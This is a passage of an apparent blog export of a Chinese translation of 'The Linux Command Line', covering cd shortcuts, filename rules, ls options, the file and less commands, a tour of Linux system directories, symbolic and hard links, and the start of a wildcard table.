<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox usr]$ cd /usr/bin</span><br><span class="line">[me@linuxbox bin]$ pwd</span><br><span class="line">/usr/bin</span><br></pre></td></tr></table></figure>

<p>或者，使用相对路径名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox usr]$ cd ./bin</span><br><span class="line">[me@linuxbox bin]$ pwd</span><br><span class="line">/usr/bin</span><br></pre></td></tr></table></figure>

<p>更改当前工作目录</p>
<p>现在，在这里有一些重要的事情要指出。在几乎所有情况下，我们可以省略 “.&#x2F;“。它是隐含的。输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox usr]$ cd bin</span><br></pre></td></tr></table></figure>

<p>执行相同的操作。通常，如果我们没有为某个内容指定路径名，将假定为当前工作目录。</p>
<h4 id="一些有用的快捷方式"><a href="#一些有用的快捷方式" class="headerlink" title="一些有用的快捷方式"></a>一些有用的快捷方式</h4><p>在表 2-1 中，我们看到可以快速更改当前工作目录的一些有用方式。</p>
<p><em>表 2-1：</em> <em>cd快捷方式</em></p>
<table>
<thead>
<tr>
<th><strong>快捷键</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>cd</td>
<td>将工作目录更改为您的主目录。</td>
</tr>
<tr>
<td>cd -</td>
<td>将工作目录更改为以前的工作目录。</td>
</tr>
<tr>
<td>cd ~<em>user_name</em></td>
<td>将工作目录更改为<em>user_name</em>用户的主目录。例如，cd ~bob 将目录更改为用户“bob”的主目录。</td>
</tr>
</tbody></table>
<h3 id="有关文件名的重要事实"><a href="#有关文件名的重要事实" class="headerlink" title="有关文件名的重要事实"></a>有关文件名的重要事实</h3><p>在 Linux 系统上，文件的命名方式与其他系统（如 Windows）类似，但有一些重要的区别。</p>
<ol>
<li><p>以句点字符开头的文件名是隐藏的。这只意味着 <code>ls</code> 不会列出它们，除非你使用 <code>ls -a</code>。在创建您的帐户时，在您的主目录中放置了几个隐藏文件，以配置您的帐户的设置。在第 11 章中，我们将更详细地查看其中一些文件，以了解如何自定义您的环境。此外，一些应用程序将它们的配置和设置文件作为隐藏文件放在您的主目录中。</p>
</li>
<li><p>在 Linux 中，与 Unix 一样，文件名和命令区分大小写。文件名“File1”和“file1”指的是不同的文件。</p>
</li>
<li><p>Linux 没有像其他一些操作系统那样的“文件扩展名”概念。您可以随意命名文件。文件的内容和&#x2F;或用途由其他方式确定。尽管类 Unix 操作系统不使用文件扩展名来确定文件的内容&#x2F;用途，但许多应用程序程序确实使用它们。</p>
</li>
<li><p>虽然 Linux 支持包含嵌入空格和标点字符的长文件名，但请将您创建的文件名称中的标点字符限制为句点、破折号和下划线。*最重要的是，不要在文件名中嵌入空格。*如果您想要表示文件名中单词之间的空格，请使用下划线字符。以后您会为此感到高兴。</p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本章解释了 shell 如何处理系统的目录结构。我们了解了绝对路径名和相对路径名以及我们用于在该结构中移动的基本命令。在下一章中，我们将利用这些知识对现代 Linux 系统进行一次导览。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>探索系统</title>
    <url>/2024/03/3-exploring-the-system/</url>
    <content><![CDATA[<h2 id="3-–-探索系统"><a href="#3-–-探索系统" class="headerlink" title="3 – 探索系统"></a>3 – 探索系统</h2><p>既然我们知道如何在文件系统中移动，现在是时候对我们的 Linux 系统进行一次导览了。然而，在开始之前，我们将学习一些在此过程中将会有用的更多命令。</p>
<ul>
<li>ls – 列出目录内容</li>
<li>file – 确定文件类型</li>
<li>less – 查看文件内容</li>
</ul>
<span id="more"></span>

<h3 id="用-ls-更有趣"><a href="#用-ls-更有趣" class="headerlink" title="用 ls 更有趣"></a>用 ls 更有趣</h3><p><code>ls</code> 命令可能是最常用的命令，而且原因充分。使用它，我们可以查看目录内容并确定各种重要的文件和目录属性。正如我们所见，我们只需输入 <code>ls</code> 就可以获得当前工作目录中包含的文件和子目录的列表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">Desktop Documents Music Pictures Public Templates Videos</span><br></pre></td></tr></table></figure>

<p>除了当前工作目录，我们可以指定要列出的目录，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr</span><br><span class="line">bin games include lib <span class="built_in">local</span> sbin share src</span><br></pre></td></tr></table></figure>

<p>我们甚至可以指定多个目录。在以下示例中，我们列出了用户的主目录（由“~”字符表示）和 <code>/usr</code> 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> ~ /usr</span><br><span class="line">/home/me:Desktop Documents Music Pictures Public Templates Videos</span><br><span class="line"></span><br><span class="line">/usr: bin games include lib <span class="built_in">local</span> sbin share src</span><br></pre></td></tr></table></figure>

<p>我们还可以更改输出的格式以显示更多详细信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l</span><br><span class="line"></span><br><span class="line">total 56</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Desktop</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Documents</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Music</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Pictures</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Public</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Templates</span><br><span class="line">drwxrwxr-x 2 me me 4096 2017-10-26 17:20 Videos</span><br></pre></td></tr></table></figure>

<p>通过将“-l”添加到命令中，我们将输出更改为长格式。</p>
<h4 id="选项和参数"><a href="#选项和参数" class="headerlink" title="选项和参数"></a>选项和参数</h4><p>这引出了关于大多数命令如何工作的一个非常重要的问题。命令通常后跟一个或多个<em>选项</em>来修改它们的行为，并且进一步后跟一个或多个<em>参数</em>，即命令操作的项目。所以大多数命令看起来有点像这样：</p>
<p><strong>command -options arguments</strong></p>
<p>大多数命令使用由破折号前面的单个字符组成的选项，例如“-l”。然而，许多命令，包括GNU项目中的命令，还支持<em>长选项</em>，由两个破折号前面的单词组成。此外，许多命令允许将多个短选项串在一起。在以下示例中，<code>ls</code> 命令给出了两个选项，即 l 选项以生成长格式输出和 t 选项以按文件修改时间对结果进行排序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -lt</span><br></pre></td></tr></table></figure>

<p>我们将添加长选项“–reverse”以颠倒排序顺序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -lt --reverse</span><br></pre></td></tr></table></figure>

<p>请注意，像 Linux 中的文件名一样，命令选项是区分大小写的。</p>
<p><code>ls</code> 命令有很多可能的选项。最常见的列在表 3-1 中。</p>
<p><em>表 3-1：常见的 ls 选项</em></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>长选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>–all</td>
<td>列出所有文件，即使它们的名称以句点开头，通常不列出（即隐藏）。</td>
</tr>
<tr>
<td>-A</td>
<td>–almost-all</td>
<td>类似于上面的 -a 选项，但它不会列出 .（当前目录）和 ..（上级目录）。</td>
</tr>
<tr>
<td>-d</td>
<td>–directory</td>
<td>通常，如果指定了目录，ls 将列出目录的内容，而不是目录本身。与 -l 选项一起使用，以查看目录的详细信息而不是其内容。</td>
</tr>
<tr>
<td>-F</td>
<td>–classify</td>
<td>此选项将在每个列出的名称的末尾附加一个指示字符。例如，如果名称是目录，则追加一个斜杠（&#x2F;）。</td>
</tr>
<tr>
<td>-h</td>
<td>–human-readable</td>
<td>在长格式列表中，以人类可读的格式显示文件大小，而不是以字节显示。</td>
</tr>
<tr>
<td>-l</td>
<td></td>
<td>以长格式显示结果。</td>
</tr>
<tr>
<td>-r</td>
<td>–reverse</td>
<td>以相反的顺序显示结果。通常，ls 以升序字母顺序显示其结果。</td>
</tr>
<tr>
<td>-S</td>
<td></td>
<td>按文件大小对结果进行排序。</td>
</tr>
<tr>
<td>-t</td>
<td></td>
<td>按修改时间对结果进行排序。</td>
</tr>
</tbody></table>
<h4 id="更详细查看长格式"><a href="#更详细查看长格式" class="headerlink" title="更详细查看长格式"></a>更详细查看长格式</h4><p>正如我们前面所看到的，-l 选项使 ls 以长格式显示其结果。这种格式包含很多有用的信息。以下是来自 Ubuntu 系统的 Examples 目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rw-r--r-- 1 root root 3576296 2017-04-03 11:05 Experience ubuntu.ogg</span><br><span class="line">-rw-r--r-- 1 root root 1186219 2017-04-03 11:05 kubuntu-leaflet.png</span><br><span class="line">-rw-r--r-- 1 root root  47584 2017-04-03 11:05 logo-Edubuntu.png</span><br><span class="line">-rw-r--r-- 1 root root  44355 2017-04-03 11:05 logo-Kubuntu.png</span><br><span class="line">-rw-r--r-- 1 root root  34391 2017-04-03 11:05 logo-Ubuntu.png</span><br><span class="line">-rw-r--r-- 1 root root  32059 2017-04-03 11:05 oo-cd-cover.odf</span><br><span class="line">-rw-r--r-- 1 root root 159744 2017-04-03 11:05 oo-derivatives.doc</span><br><span class="line">-rw-r--r-- 1 root root  27837 2017-04-03 11:05 oo-maxwell.odt</span><br><span class="line">-rw-r--r-- 1 root root  98816 2017-04-03 11:05 oo-trig.xls</span><br><span class="line">-rw-r--r-- 1 root root 453764 2017-04-03 11:05 oo-welcome.odt</span><br><span class="line">-rw-r--r-- 1 root root 358374 2017-04-03 11:05 ubuntu Sax.ogg</span><br></pre></td></tr></table></figure>

<p>表 3-2 让我们看一下其中一个文件的不同字段及其含义。</p>
<p><em>表 3-2：ls 长列表字段</em></p>
<table>
<thead>
<tr>
<th><strong>字段</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-rw-r–r–</td>
<td>文件的访问权限。第一个字符表示文件的类型。在不同类型中，前导破折号表示常规文件，而“d”表示目录。接下来的三个字符是文件所有者的访问权限，接下来的三个字符是文件组的成员的访问权限，最后的三个字符是其他所有人的访问权限。第 9 章“权限”将更详细地讨论这个问题。</td>
</tr>
<tr>
<td>1</td>
<td>文件的硬链接数。请参见本章后面的“符号链接”和“硬链接”部分。</td>
</tr>
<tr>
<td>root</td>
<td>文件所有者的用户名。</td>
</tr>
<tr>
<td>root</td>
<td>拥有文件的组的名称。</td>
</tr>
<tr>
<td>32059</td>
<td>文件的大小（以字节为单位）。</td>
</tr>
<tr>
<td>2007-04-03 11:05</td>
<td>文件的最后修改时间。</td>
</tr>
<tr>
<td>oo-cd-cover.odf</td>
<td>文件的名称。</td>
</tr>
</tbody></table>
<p>使用 <code>ls</code> 获得更多乐趣。</p>
<h3 id="使用-file-确定文件类型"><a href="#使用-file-确定文件类型" class="headerlink" title="使用 file 确定文件类型"></a>使用 <code>file</code> 确定文件类型</h3><p>在探索系统时，了解文件包含的内容将会很有用。为了做到这一点，我们将使用 <code>file</code> 命令来确定文件的类型。正如我们之前讨论的，Linux 中的文件名不要求反映文件的内容。虽然像 “picture.jpg” 这样的文件名通常会被认为包含 JPEG 压缩的图像，但在 Linux 中并不是必须的。我们可以这样调用 <code>file</code> 命令：</p>
<h4 id="file-文件名"><a href="#file-文件名" class="headerlink" title="**file **文件名"></a>**file **<em><strong>文件名</strong></em></h4><p>在调用时，<code>file</code> 命令将打印文件内容的简要描述。例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ file picture.jpg</span><br><span class="line">picture.jpg: JPEG image data, JFIF standard 1.01</span><br></pre></td></tr></table></figure>

<p>文件有很多种。事实上，在类 Unix 操作系统（如 Linux）中，“一切皆文件”是一个常见的理念。在我们继续学习的过程中，我们将看到这种说法是多么的正确。</p>
<p>虽然我们系统上的许多文件是熟悉的，例如 MP3 和 JPEG，但还有很多种类并不那么明显，还有一些相当奇怪的。</p>
<h3 id="使用-less-查看文件内容"><a href="#使用-less-查看文件内容" class="headerlink" title="使用 less 查看文件内容"></a>使用 <code>less</code> 查看文件内容</h3><p><code>less</code> 命令是一个查看文本文件的程序。在我们的 Linux 系统中，有许多包含可读文本的文件。<code>less</code> 程序提供了一种方便的方式来查看它们。</p>
<p><strong>什么是“文本”？</strong></p>
<p>在计算机上表示信息的方式有很多种。所有这些方法都涉及定义信息与将用于表示它的一些数字之间的关系。毕竟，计算机只理解数字，所有的数据都会被转换为数字表示。</p>
<p>其中一些表示系统非常复杂（如压缩的视频文件），而另一些则相当简单。最早和最简单之一被称为 <em>ASCII 文本</em>。ASCII（发音为 “As-Key”）是信息交换的美国标准代码的缩写。这是一种最早在电传打字机上用于将键盘字符映射到数字的简单编码方案。</p>
<p>文本是一种字符到数字的简单一对一映射。它非常紧凑。五十个字符的文本翻译为五十个字节的数据。重要的是要理解，文本只包含字符到数字的简单映射。它与由 Microsoft Word 或 LibreOffice Writer 创建的文字处理文档不同。与简单的 ASCII 文本相反，这些文件包含许多非文本元素，用于描述其结构和格式。纯 ASCII 文本文件仅包含字符本身和一些基本的控制代码，如制表符、回车和换行符。</p>
<p>在整个 Linux 系统中，许多文件以文本格式存储，并且有许多 Linux 工具可以处理文本文件。即使 Windows 也认识到这种格式的重要性。著名的 NOTEPAD.EXE 程序就是用于编辑纯 ASCII 文本文件的编辑器。</p>
<p>为什么我们要查看文本文件呢？因为许多包含系统设置（称为<em>配置文件</em>）的文件都以这种格式存储，能够阅读它们使我们了解系统的工作方式。此外，一些系统使用的实际程序（称为<em>脚本</em>）也以这种格式存储。在后面的章节中，我们将学习如何编辑文本文件以修改系统设置并编写我们自己的脚本，但现在我们只是查看它们的内容。</p>
<p><code>less</code> 命令的使用方法如下：</p>
<h4 id="less-文件名"><a href="#less-文件名" class="headerlink" title="**less **文件名"></a>**less **<em><strong>文件名</strong></em></h4><p>一旦启动，<code>less</code> 程序允许我们在文本文件中向前和向后滚动。例如，要查看定义系统所有用户帐户的文件，请输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ less /etc/passwd</span><br></pre></td></tr></table></figure>

<p>一旦启动 <code>less</code> 程序，我们可以查看文件的内容。如果文件超过一页，我们可以向上和向下滚动。要退出 <code>less</code>，请按下键盘上的 q 键。下表列出了 <code>less</code> 使用的最常见键盘命令。</p>
<p><em>Table 3-3:</em> <em>less 命令</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Page Up 或 b</td>
<td>向后滚动一页</td>
</tr>
<tr>
<td>Page Down 或 space</td>
<td>向前滚动一页</td>
</tr>
<tr>
<td>Up 箭头</td>
<td>向上滚动一行</td>
</tr>
<tr>
<td>Down 箭头</td>
<td>向下滚动一行</td>
</tr>
<tr>
<td>G</td>
<td>移动到文本文件的末尾</td>
</tr>
<tr>
<td>1G 或 g</td>
<td>移动到文本文件的开头</td>
</tr>
<tr>
<td>&#x2F;<em>字符</em></td>
<td>向前搜索下一个 <em>字符</em> 出现的位置</td>
</tr>
<tr>
<td>n</td>
<td>搜索上一次搜索的下一个出现位置</td>
</tr>
<tr>
<td>h</td>
<td>显示帮助屏幕</td>
</tr>
<tr>
<td>q</td>
<td>退出 <code>less</code></td>
</tr>
</tbody></table>
<p><code>less</code> 程序是作为早期的 Unix 程序 <code>more</code> 的改进版本而设计的。名称 “less” 是对短语 “less is more”（即现代主义建筑师和设计师的座右铭）的一种戏谑。</p>
<p><code>less</code> 属于一类称为“分页器”的程序，这些程序允许以逐页的方式轻松查看长文本文档。与 <code>more</code> 程序只能向前翻页不同，<code>less</code> 程序允许向前和向后翻页，并且还具有许多其他功能。</p>
<h3 id="进行导览"><a href="#进行导览" class="headerlink" title="进行导览"></a>进行导览</h3><p>Linux 系统上的文件系统布局很像其他类 Unix 系统上的布局。实际上，该设计在一项名为 <em>Linux 文件系统层次结构标准</em> 的公开标准中有所规定。并非所有的 Linux 发行版都完全符合标准，但大多数都很接近。</p>
<p>接下来，我们将自己在文件系统中游荡，看看是什么让我们的 Linux 系统运转起来。这将为我们提供练习导航技能的机会。我们将发现许多有趣的文件都是以纯人类可读的文本形式存在的。在进行导览时，请尝试以下步骤：</p>
<ol>
<li>进入指定的目录</li>
<li>使用 <code>ls -l</code> 列出目录内容</li>
<li>如果看到有趣的文件，请使用 <code>file</code> 确定其内容</li>
<li>如果它看起来可能是文本，请尝试使用 <code>less</code> 查看</li>
<li>如果我们意外尝试查看非文本文件并且它搞乱了终端窗口，我们可以通过输入 <code>reset</code> 命令进行恢复。</li>
</ol>
<p><strong>记住复制粘贴技巧！</strong> 如果您使用鼠标，您可以双击文件名将其复制，然后中键单击将其粘贴到命令中。</p>
<p>当我们四处走动时，不要害怕查看内容。通常情况下，普通用户基本上是被禁止破坏系统的。那是系统管理员的工作！如果一个命令抱怨某事，只需转向其他事物。花些时间四处看看。这个系统是我们探索的领域。请记住，在 Linux 中，没有秘密！</p>
<p>表3-4列举了我们可以探索的一些目录。根据我们的 Linux 发行版，可能会有一些细微差别。不要害怕四处看看，尝试更多！</p>
<p><em>表3-4：Linux 系统中的一些目录</em></p>
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>注释</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;</td>
<td>根目录。一切从这里开始。</td>
</tr>
<tr>
<td>&#x2F;bin</td>
<td>包含必须存在于系统引导和运行过程中的二进制（程序）。</td>
</tr>
<tr>
<td>&#x2F;boot</td>
<td>包含 Linux 内核、初始 RAM 磁盘映像（用于引导时需要的驱动程序）和引导加载程序。有趣的文件：● &#x2F;boot&#x2F;grub&#x2F;grub.conf 或 menu.lst，用于配置引导加载程序。● &#x2F;boot&#x2F;vmlinuz（或类似的文件），Linux 内核。</td>
</tr>
</tbody></table>
<p>进行导览</p>
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>注释</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;dev</td>
<td>这是一个包含 <em>设备节点</em> 的特殊目录。“一切皆文件”也适用于设备。这是内核维护其了解的所有设备的列表的地方。</td>
</tr>
<tr>
<td>&#x2F;etc</td>
<td>&#x2F;etc 目录包含系统范围的所有配置文件。它还包含在启动时启动系统服务的一组 shell 脚本。该目录中的所有内容都应该是可读的文本。有趣的文件：虽然 &#x2F;etc 中的一切都很有趣，但以下是一些永远的经典：● &#x2F;etc&#x2F;crontab，定义自动作业运行时间的文件。● &#x2F;etc&#x2F;fstab，存储设备及其关联挂载点的表。● &#x2F;etc&#x2F;passwd，用户帐户列表。</td>
</tr>
<tr>
<td>&#x2F;home</td>
<td>在正常配置中，每个用户在 &#x2F;home 中都有一个目录。普通用户只能在其个人目录中写文件。此限制可保护系统免受用户错误活动的影响。</td>
</tr>
<tr>
<td>&#x2F;lib</td>
<td>包含核心系统程序使用的共享库文件。这类似于 Windows 中的动态链接库（DLL）。</td>
</tr>
<tr>
<td>&#x2F;lost+found</td>
<td>使用 Linux 文件系统（例如 ext4）的每个格式化的分区或设备都将拥有此目录。在部分从文件系统损坏事件中进行恢复的情况下使用。除非我们的系统发生了真正糟糕的事情，否则此目录将保持为空。</td>
</tr>
<tr>
<td>&#x2F;media</td>
<td>在现代 Linux 系统上，&#x2F;media 目录将包含可移动介质的挂载点，如自动插入时挂载的 USB 驱动器、CD-ROM 等。</td>
</tr>
<tr>
<td>&#x2F;mnt</td>
<td>在旧版 Linux 系统上，&#x2F;mnt 目录包含手动挂载的可移动设备的挂载点。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>注释</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;opt</td>
<td>&#x2F;opt 目录用于安装“可选”软件。主要用于存放可能安装在系统上的商业软件产品。</td>
</tr>
<tr>
<td>&#x2F;proc</td>
<td>&#x2F;proc 目录是特殊的。从硬盘存储文件的意义上说，它不是一个真正的文件系统。相反，它是由 Linux 内核维护的虚拟文件系统。它包含的“文件”是对内核本身的窥视孔。这些文件是可读的，将给我们展示内核如何看待计算机的图片。</td>
</tr>
<tr>
<td>&#x2F;root</td>
<td>这是 root 帐户的主目录。</td>
</tr>
<tr>
<td>&#x2F;sbin</td>
<td>此目录包含“系统”二进制文件。这些是执行通常为超级用户保留的重要系统任务的程序。</td>
</tr>
<tr>
<td>&#x2F;tmp</td>
<td>&#x2F;tmp 目录用于存储由各种程序创建的临时文件。某些配置导致此目录在每次系统重新启动时被清空。</td>
</tr>
<tr>
<td>&#x2F;usr</td>
<td>&#x2F;usr 目录树可能是 Linux 系统上最大的目录树。它包含所有常规用户使用的程序和支持文件。</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;bin</td>
<td>&#x2F;usr&#x2F;bin 包含 Linux 发行版安装的可执行程序。这个目录通常包含数千个程序。</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;lib</td>
<td>&#x2F;usr&#x2F;bin 中程序的共享库。</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;local</td>
<td>&#x2F;usr&#x2F;local 目录树是用于安装不包含在发行版中但用于系统范围使用的程序的地方。从源代码编译的程序通常安装在 &#x2F;usr&#x2F;local&#x2F;bin 中。在新安装的 Linux 系统上，此目录树存在，但在系统管理员放入内容之前将为空。</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;sbin</td>
<td>包含更多的系统管理程序。</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;share</td>
<td>&#x2F;usr&#x2F;bin 中程序使用的所有共享数据都在 &#x2F;usr&#x2F;share 中。包括默认配置文件、图标、屏幕背景、声音文件等。</td>
</tr>
</tbody></table>
<p>进行导览</p>
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>注释</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;usr&#x2F;share&#x2F;doc</td>
<td>系统上安装的大多数软件包都将包含某种形式的文档。在 &#x2F;usr&#x2F;share&#x2F;doc 中，我们将找到按软件包组织的文档文件。</td>
</tr>
<tr>
<td>&#x2F;var</td>
<td>除了 &#x2F;tmp 和 &#x2F;home 之外，到目前为止我们查看的目录保持相对静态，即它们的内容不会改变。&#x2F;var 目录树是存储可能发生变化的数据的地方。各种数据库、spool 文件、用户邮件等都位于此处。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log</td>
<td>&#x2F;var&#x2F;log 包含<em>日志文件</em>，记录各种系统活动。这些是重要的，并应定期进行监视。最有用的是 &#x2F;var&#x2F;log&#x2F;messages 和 &#x2F;var&#x2F;log&#x2F;syslog。请注意，基于某些系统出于安全原因，只有超级用户可以查看日志文件。</td>
</tr>
</tbody></table>
<h3 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h3><p>当我们四处查看时，我们可能会看到一个目录列表（例如，&#x2F;lib），其中有一个条目如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root  11 2007-08-11 07:34 libc.so.6 -&gt; libc-2.6.so</span><br></pre></td></tr></table></figure>

<p>注意列表的第一个字母是“l”，并且该条目似乎有两个文件名？这是一种称为<em>符号链接</em>（也称为<em>软链接</em>或<em>symlink</em>）的特殊类型文件。在大多数类 Unix 系统中，可以通过多个名称引用文件。虽然这可能不明显，但它实际上是一个有用的功能。</p>
<p>想象一下这种情景：一个程序需要使用包含在名为“foo”的文件中的某种共享资源，但“foo”经常更改版本。将版本号包含在文件名中将是一个好主意，以便管理员或其他感兴趣的人可以查看安装的“foo”的版本。这带来了一个问题。如果更改了共享资源的名称，我们必须追踪可能使用它的每个程序，并在每次安装资源的新版本时更改它以查找新的资源名称。这一点一点也不有趣。</p>
<p>这就是符号链接拯救一天的地方。假设我们安装了“foo”的 2.6 版本，其文件名为“foo-2.6”，然后创建一个简单称为“foo”的符号链接，它指向“foo-2.6”。这意味着当程序打开文件“foo”时，实际上它正在打开文件“foo-2.6”。现在大家都很高兴。依赖于“foo”的程序可以找到它，而我们仍然可以看到安装的实际版本。当升级到“foo2.7”的时候，我们只需将文件添加到系统中，删除指向旧版本的符号链接“foo”，然后创建一个指向新版本的符号链接。这不仅解决了版本升级的问题，而且还允许我们在计算机上保留两个版本。想象一下，“foo2.7”有一个错误（可恶的开发人员！）并且我们需要恢复到旧版本。同样，我们只需删除指向新版本的符号链接并创建一个指向旧版本的新符号链接。</p>
<p>本节开始的目录列表（来自 Fedora 系统的 &#x2F;lib 目录）显示了一个名为 libc.so.6 的符号链接，指向一个名为 libc-2.6.so 的共享库文件。这意味着寻找 libc.so.6 的程序实际上将得到文件 libc-2.6.so。我们将在下一章中学习如何创建符号链接。</p>
<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><p>在谈到链接时，我们需要提到还有第二种类型的链接，称为<em>硬链接</em>。硬链接也允许文件有多个名称，但它们是以不同的方式实现的。在下一章中，我们将更多地讨论符号链接和硬链接之间的区别。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过我们的导览，我们已经对系统有了很多了解。我们看到了各种文件和目录以及它们的内容。我们应该从中得到的一个结论是系统是多么的开放。在 Linux 中，有许多重要的文件是纯人类可读的文本。与许多专有系统不同，Linux 使一切都可以供审查和学习。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p><em>Linux Filesystem Hierarchy Standard</em> 的完整版本可以在这里找到：<span class="exturl" data-url="aHR0cDovL3d3dy5wYXRobmFtZS5jb20vZmhzLw==">http://www.pathname.com/fhs/<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>有关 Unix 和类 Unix 系统目录结构的文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Vbml4X2RpcmVjdG9yeV9zdHJ1Y3R1cmU=">http://en.wikipedia.org/wiki/Unix_directory_structure<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>ASCII 文本格式的详细描述：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9BU0NJSQ==">http://en.wikipedia.org/wiki/ASCII<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>操纵文件和目录</title>
    <url>/2024/03/4-manipulating-files-directories/</url>
    <content><![CDATA[<h2 id="4-–-操纵文件和目录"><a href="#4-–-操纵文件和目录" class="headerlink" title="4 – 操纵文件和目录"></a>4 – 操纵文件和目录</h2><p>到目前为止，我们已经准备好进行一些实际的工作了！本章将介绍以下命令：</p>
<ul>
<li><strong>cp</strong> – 复制文件和目录</li>
<li><strong>mv</strong> – 移动&#x2F;重命名文件和目录</li>
<li><strong>mkdir</strong> – 创建目录</li>
<li><strong>rm</strong> – 删除文件和目录</li>
<li><strong>ln</strong> – 创建硬链接和符号链接</li>
</ul>
<span id="more"></span>

<p>这五个命令是最常用的 Linux 命令之一。它们用于操纵文件和目录。</p>
<p>老实说，这些命令执行的一些任务在图形文件管理器中更容易完成。使用文件管理器，我们可以将文件从一个目录拖放到另一个目录，剪切和粘贴文件，删除文件等等。那么为什么要使用这些老式的命令行程序呢？</p>
<p>答案是力量和灵活性。虽然使用图形文件管理器可以轻松执行简单的文件操作，但使用命令行程序可以更轻松地执行复杂的任务。例如，我们如何将一个目录中的所有 HTML 文件复制到另一个目录，但仅复制在目标目录中不存在或比目标目录中的版本更新的文件？使用文件管理器可能会比较困难，但使用命令行却相对容易。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -u *.html destination</span><br></pre></td></tr></table></figure>

<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>在我们开始使用这些命令之前，我们需要讨论一下一个使这些命令如此强大的 shell 功能。由于 shell 经常使用文件名，它提供了一些特殊字符，帮助我们快速指定文件名的组。这些特殊字符被称为 <em>通配符</em>。使用通配符（也称为 <em>通配符扩展</em>）允许我们根据字符模式选择文件名。表 4-1 列出了通配符及其选择的内容。</p>
<p><em>Table 4-1: 通配符</em></p>
<table>
<thead>
<tr>
<th><strong>通配符</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配任意字符</td>
</tr>
<tr>
<td>?</td>
<td>匹配任意单个字符</td>
</tr>
<tr>
<td>[<em>characters</em>]</td>
<td>匹配集合 <em>characters</em> 中的任意字符</td>
</tr>
<tr>
<td>[!<em>characters</em>]</td>
<td>匹配不在集合 <em>characters</em> 中的任意字符</td>
</tr>
<tr>
<td>[[:<em>class</em>:]]</td>
<td>匹配属于指定 <em>class</em> 的任意字符</td>
</tr>
</tbody></table>
<p>表 4-2 列出了最常用的字符类。</p>
<p><em>Table 4-2: 常用字符类</em></p>
<table>
<thead>
<tr>
<th><strong>字符类</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>[:alnum:]</td>
<td>匹配任意字母数字字符</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>匹配任意字母字符</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>匹配任意数字</td>
